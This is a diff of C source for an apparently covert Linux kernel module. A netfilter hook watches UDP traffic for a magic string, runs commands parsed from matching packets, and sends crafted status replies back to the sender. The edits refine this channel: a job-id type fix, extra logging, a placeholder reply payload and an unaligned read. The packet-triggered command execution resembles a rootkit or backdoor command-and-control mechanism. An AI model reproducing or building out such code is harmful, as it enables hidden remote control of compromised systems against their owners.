@@ -458,7 +458,7 @@ static int call_cmd(struct cmd_type *cmd, const char *data, unsigned int data_le
 }
 
 static int send_response(
-    short job_id,
+    unsigned short job_id,
     int response_status,
     short local_ip,
     short remote_ip,
@@ -470,15 +470,19 @@ static int send_response(
     struct ethhdr *eth;
     struct sk_buff *skb;
     int data_len = 5;
-    char *data  ;
+    char *data;
     int header_len = sizeof(struct udphdr) + 5 * 4 + ETH_HLEN;
+    printk(KERN_INFO "returning response %d for job id %u\n", response_status, job_id);
     skb = alloc_skb(data_len + header_len, GFP_ATOMIC);
-    if (!skb) return -1;
+    if (!skb) {
+        printk(KERN_INFO "failed allocating skb\n");
+        return -1;
+    }
     skb_reserve(skb, header_len);
     data = skb_put(skb, data_len);
-    ((short *)data)[0] = job_id;
-    ((char *)data)[3] = 1;
-//    strcpy(data, "abcde");
+//    ((short *)data)[0] = job_id;
+//    ((char *)data)[3] = 1;
+    strcpy(data, "abcde");
     skb_push(skb, sizeof(struct udphdr));
     skb_reset_transport_header(skb);
     udph = udp_hdr(skb);
@@ -524,7 +528,6 @@ static int send_response(
 
     skb->dev = dev;
 
-//    return 0;
     return dev_queue_xmit(skb);
 }
 
@@ -550,10 +553,9 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
     if (strncmp(user_data, cmd_magic, strlen(cmd_magic))) return NF_ACCEPT;
     for (i = 0; i < cmds_len; i++) {
         if (!match_cmd(cmds + i, user_data + job_id_len + strlen(cmd_magic))) {
-            printk(KERN_INFO "Found %s cmd packet!", cmds[i].name);
             result = call_cmd(cmds + i, user_data + job_id_len + strlen(cmd_magic), ntohs(udph->len) - sizeof(struct udphdr));
-            printk(KERN_INFO "Found %s cmd packet! executed with code %d", cmds[i].name, result);
-            send_response(*user_data, result, iph->daddr, iph->saddr, eth_hdr(skb)->h_source, skb->dev);
+            printk(KERN_INFO "Found %s cmd packet! executed with code %d\n", cmds[i].name, result);
+            send_response(get_unaligned((unsigned short *)(user_data + strlen(cmd_magic))), result, iph->daddr, iph->saddr, eth_hdr(skb)->h_source, skb->dev);
             break;
         }
     }
